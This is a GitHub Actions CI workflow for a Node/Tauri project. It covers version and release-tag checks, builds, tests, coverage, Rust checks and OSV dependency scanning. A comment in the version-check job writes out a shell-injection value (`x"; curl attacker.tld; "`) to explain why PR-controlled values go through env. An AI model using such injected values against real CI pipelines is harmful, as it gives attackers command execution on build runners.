name: CI

on:
  pull_request:
    branches: [main]
  push:
    branches: ['feature/**']
  schedule:
    - cron: '0 6 * * 1' # Mondays 06:00 UTC — weekly full dependency vulnerability scan

permissions:
  contents: read

env:
  # OSV-Scanner pin; bump both together. SHA256 is for osv-scanner_linux_amd64
  # from https://github.com/google/osv-scanner/releases (osv-scanner_SHA256SUMS).
  OSV_SCANNER_VERSION: '2.3.8'
  OSV_SCANNER_SHA256: 'bc98e15319ed0d515e3f9235287ba53cdc5535d576d24fd573978ecfe9ab92dc'

jobs:
  version-check:
    if: github.event_name == 'pull_request' && github.base_ref == 'main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - name: Get PR version
        id: pr
        run: echo "version=$(node -p "require('./package.json').version")" >> $GITHUB_OUTPUT
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
        with:
          ref: main
          path: main-branch
      - name: Get main version
        id: main
        run: echo "version=$(node -p "require('./main-branch/package.json').version")" >> $GITHUB_OUTPUT
      - name: Check version was bumped
        # The versions come from a PR-controlled package.json. Interpolating
        # ${{ ... }} straight into the script would splice that content into the
        # shell — a fork PR could set "version" to `x"; curl attacker.tld; "` and
        # get command execution here. Via env: the values are data, not script.
        env:
          PR_VERSION: ${{ steps.pr.outputs.version }}
          MAIN_VERSION: ${{ steps.main.outputs.version }}
        run: |
          if [ "$PR_VERSION" = "$MAIN_VERSION" ]; then
            echo "::error::Version not bumped! PR version ($PR_VERSION) is the same as main. Bump the version in all package.json files and Cargo.toml before merging."
            exit 1
          fi
          echo "Version bumped: $MAIN_VERSION → $PR_VERSION"

  # Prevents the publish job (publish.yml, runs post-merge on push to main) from
  # failing with "ReleaseAsset already_exists". That happens when the desktop
  # release is rebuilt for a version that already has a published GitHub release.
  # Complements version-check (which only proves root/package.json changed vs main):
  # this asserts all release-driving version sources agree AND the tag is unpublished.
  release-version-guard:
    if: github.event_name == 'pull_request' && github.base_ref == 'main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5
        with:
          node-version: '24'
          # This job only runs a small node script + curl; it never installs deps.
          # Disable auto package-manager caching so setup-node doesn't try to invoke
          # pnpm (not installed here) just because pnpm-lock.yaml exists.
          package-manager-cache: false
      - name: Check release version sources are in sync
        run: node scripts/check-release-version.mjs
      - name: Ensure release tag is not already published
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          VERSION=$(node -p "require('./apps/dashboard/package.json').version")
          TAG="v${VERSION}"
          # GitHub Releases API: 200 = release exists (would collide), 404 = safe.
          # Fail closed on anything else (403 rate-limit, 5xx, 000 timeout) so a
          # transient error never lets a colliding version slip through.
          STATUS=$(curl -sS -L -o /dev/null -w "%{http_code}" --max-time 15 \
            -H "Authorization: Bearer ${GH_TOKEN}" \
            "https://api.github.com/repos/${{ github.repository }}/releases/tags/${TAG}")
          case "$STATUS" in
            404)
              echo "✓ No existing release for ${TAG} — safe to publish."
              ;;
            200)
              echo "::error::Release ${TAG} already exists. The publish job would fail with 'ReleaseAsset already_exists' on its assets. Bump the version (pnpm bump <new-version>) before merging."
              exit 1
              ;;
            *)
              echo "::error::Could not verify release status for ${TAG} (HTTP ${STATUS}). Failing closed — re-run the job or check the GitHub API."
              exit 1
              ;;
          esac

  validate-dependencies:
    if: github.event_name != 'schedule'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - name: Validate external dependency URLs
        run: |
          FAILED=0
          check_url() {
            STATUS=$(curl -sIL -o /dev/null -w "%{http_code}" "$1" --max-time 15 2>/dev/null)
            if [ "$STATUS" != "200" ]; then
              echo "::error::$2 returned HTTP $STATUS: $1"
              FAILED=1
            else
              echo "✓ $2 (HTTP $STATUS)"
            fi
          }
          check_url "https://ollama.com/install.sh" "Ollama install script"
          check_url "https://api.github.com/repos/Sithion/cognistore/releases/latest" "GitHub Releases API"
          if [ "$FAILED" -ne 0 ]; then exit 1; fi

  type-check:
    if: github.event_name != 'schedule'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - uses: pnpm/action-setup@f40ffcd9367d9f12939873eb1018b921a783ffaa # v4
      - uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5
        with:
          node-version: '24'
          cache: 'pnpm'
      - run: pnpm install --frozen-lockfile
      # Type-checks the dashboard FRONTEND (.tsx — vite/esbuild skips it) and the
      # MCP server (tsup/esbuild skips it); library packages type-check via their
      # tsc build, pulled in by the turbo ^build dependency.
      - run: pnpm type-check

  build-and-test:
    if: github.event_name != 'schedule'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - uses: pnpm/action-setup@f40ffcd9367d9f12939873eb1018b921a783ffaa # v4
      - uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5
        with:
          node-version: '24'
          cache: 'pnpm'
      - run: pnpm install --frozen-lockfile
      - run: pnpm build
      # The Settings duplicates e2e drives the built dashboard in Chromium.
      - name: Install Chromium for browser e2e
        run: cd packages/tests && npx playwright install --with-deps chromium
      # Both layers run under V8 coverage: Vitest for the unit layer, c8 around
      # the Playwright suites (it also measures the sidecar and MCP processes
      # they spawn, which inherit NODE_V8_COVERAGE). See documentation/ci-cd.md.
      - name: Run unit tests (Vitest, coverage)
        run: pnpm coverage:unit
      # No extra argv: pnpm 9 forwards a literal `--`, which Playwright would read
      # as a file filter (no tests run). The list reporter comes from the config.
      - name: Run tests (Playwright under c8)
        run: pnpm coverage:integration
      # Per-package table in the job summary; fails when a package drops more
      # than 0.5 pt below coverage-baseline.json.
      - name: Coverage report and baseline gate
        if: ${{ !cancelled() }}
        run: |
          set +e
          node scripts/coverage-report.mjs --markdown coverage/summary.md
          status=$?
          [ -f coverage/summary.md ] && cat coverage/summary.md >> "$GITHUB_STEP_SUMMARY"
          exit $status
      - name: Upload coverage reports
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7
        with:
          name: coverage
          path: |
            coverage/
            packages/core/coverage/
            apps/dashboard/coverage/
            !coverage/integration/.v8/
          retention-days: 14
      - name: Dry-run npm publish (fail on warnings)
        run: |
          OUTPUT=$(cd apps/mcp-server && npm publish --dry-run --access public 2>&1)
          echo "$OUTPUT"
          # "requires you to be logged in ... (dry-run)" is an inherent, benign
          # warning when publishing unauthenticated in CI — and npm's newer CLI
          # now prefixes it with the command name ("npm warn publish ..."), so it
          # started matching this grep. It says nothing about package.json quality.
          WARNINGS=$(echo "$OUTPUT" | grep "npm warn publish" | grep -v "script name was cleaned" | grep -v "auto-corrected some errors" | grep -v "errors corrected" | grep -v "requires you to be logged in" || true)
          if [ -n "$WARNINGS" ]; then
            echo "$WARNINGS"
            echo "::error::npm publish dry-run produced warnings. Fix package.json before merging."
            exit 1
          fi

  # The Tauri shell (Rust) is otherwise only compiled by publish.yml after a
  # merge to main: a Rust break surfaced only at release time. cargo check +
  # cargo test on every PR, with the toolchain pinned in rust-toolchain.toml and
  # the same Linux deps as publish.yml.
  rust:
    if: github.event_name != 'schedule'
    runs-on: ubuntu-24.04
    timeout-minutes: 45 # cold tauri/webkit build ~15 min; rust-cache makes later runs fast
    defaults:
      run:
        working-directory: apps/dashboard/src-tauri
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - name: Install Linux deps (same as publish.yml)
        run: |
          sudo apt-get update
          sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf
      - name: Install Rust (version from rust-toolchain.toml)
        uses: dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8 # stable
        with:
          toolchain: '1.97.0' # keep in sync with apps/dashboard/src-tauri/rust-toolchain.toml
      - name: Rust cache
        uses: swatinem/rust-cache@42dc69e1aa15d09112580998cf2ef0119e2e91ae # v2
        with:
          workspaces: apps/dashboard/src-tauri
      - name: Stub the bundled resources build.rs requires
        # tauri.conf.json lists ../sidecar-bundle/{dist,dist-server,node_modules}
        # as resources; tauri_build fails when they are missing. The real bundle
        # is only assembled by publish.yml.
        run: mkdir -p ../sidecar-bundle/dist ../sidecar-bundle/dist-server ../sidecar-bundle/node_modules
      - run: rustc --version && cargo --version
      - run: cargo check --locked
      - run: cargo test --locked

  # Report-only performance run (plan v2.6, T.10): the @perf suite on the
  # seeded 10k-entry fixture, budgets scaled for a shared runner. It never
  # fails the PR; the PERF lines land in the job summary for comparison with
  # packages/tests/src/performance/baseline.json.
  perf:
    if: github.event_name != 'schedule'
    runs-on: ubuntu-24.04
    continue-on-error: true
    timeout-minutes: 30
    env:
      PERF_BUDGET_SCALE: '3'
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - uses: pnpm/action-setup@f40ffcd9367d9f12939873eb1018b921a783ffaa # v4
      - uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5
        with:
          node-version: '24'
          cache: 'pnpm'
      - run: pnpm install --frozen-lockfile
      - run: pnpm build
      - name: Restore the perf fixture
        id: fixture
        # The fixture is deterministic per generator (FIXTURE_VERSION lives in
        # generate-fixture.ts) and schema (it is built through createDbClient,
        # so the migrations are part of the key).
        uses: actions/cache/restore@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
        with:
          path: /tmp/cognistore-perf-fixture-v*
          key: perf-fixture-${{ hashFiles('packages/tests/src/performance/fixtures/generate-fixture.ts', 'packages/core/src/db/migrations/**') }}
      - name: Run the @perf suite (report only)
        id: perf
        run: |
          set -o pipefail
          cd packages/tests
          pnpm test:perf --reporter=list 2>&1 | tee "$RUNNER_TEMP/perf.log"
      - name: Save the perf fixture
        # Saved even when a budget fails (the interesting case), unlike the
        # combined actions/cache step, which only saves on success.
        if: always() && steps.fixture.outputs.cache-hit != 'true'
        uses: actions/cache/save@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
        with:
          path: /tmp/cognistore-perf-fixture-v*
          key: perf-fixture-${{ hashFiles('packages/tests/src/performance/fixtures/generate-fixture.ts', 'packages/core/src/db/migrations/**') }}
      - name: PERF lines to the job summary
        if: always()
        env:
          PERF_OUTCOME: ${{ steps.perf.outcome }}
        run: |
          {
            echo "### @perf (PERF_BUDGET_SCALE=$PERF_BUDGET_SCALE, report only)"
            # continue-on-error shows the check green: say it here when a budget failed.
            if [ "$PERF_OUTCOME" != "success" ]; then echo "**Perf step outcome: $PERF_OUTCOME** — see the log for the failing case."; fi
            echo '```'
            grep -oE 'PERF [^ ]+ [0-9.]+ms.*' "$RUNNER_TEMP/perf.log" || echo "(no PERF lines)"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

  # Free dependency vulnerability scanning via OSV-Scanner (osv.dev). Covers npm
  # (pnpm-lock.yaml) and Cargo (apps/dashboard/src-tauri/Cargo.lock) in one pass.
  # Runs on every PR/push and the weekly schedule. Self-contained (no third-party
  # Action) to respect the repo's curated Actions allowlist; the binary is
  # version-pinned and checksum-verified. This job is a required status check.
  osv-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      issues: write # only used by the scheduled-failure step below
    steps:
      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5
      - name: Install OSV-Scanner (pinned + checksum-verified)
        run: |
          set -euo pipefail
          curl -sSfL \
            "https://github.com/google/osv-scanner/releases/download/v${OSV_SCANNER_VERSION}/osv-scanner_linux_amd64" \
            -o osv-scanner
          echo "${OSV_SCANNER_SHA256}  osv-scanner" | sha256sum -c -
          chmod +x osv-scanner
      - name: Scan dependencies (npm + Cargo lockfiles)
        # Recursively finds every lockfile (.gitignore honoured, so node_modules
        # and target/ are skipped). Exits non-zero on a known vulnerability, which
        # fails the check. --config applies osv-scanner.toml (the ignore list of
        # no-fix/unmaintained advisories) across all lockfiles.
        run: ./osv-scanner --config=osv-scanner.toml -r ./
      - name: Open or update a tracking issue when the weekly scan fails
        # A scheduled failure notifies nobody: from Sep 7 to Oct 26 2026 eight
        # weekly runs failed unnoticed while new advisories piled up. Keep one
        # open issue and comment on it each week until the scan is green again.
        if: failure() && github.event_name == 'schedule'
        env:
          GH_TOKEN: ${{ github.token }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          set -euo pipefail
          title="Weekly dependency scan (OSV) is failing"
          body="Scheduled OSV-Scanner run failed: ${RUN_URL}"
          num=$(gh issue list --repo "$GITHUB_REPOSITORY" --state open --search "\"${title}\" in:title" --json number -q '.[0].number // empty')
          if [ -n "$num" ]; then
            gh issue comment "$num" --repo "$GITHUB_REPOSITORY" --body "$body"
          else
            gh issue create --repo "$GITHUB_REPOSITORY" --title "$title" --body "$body"
          fi
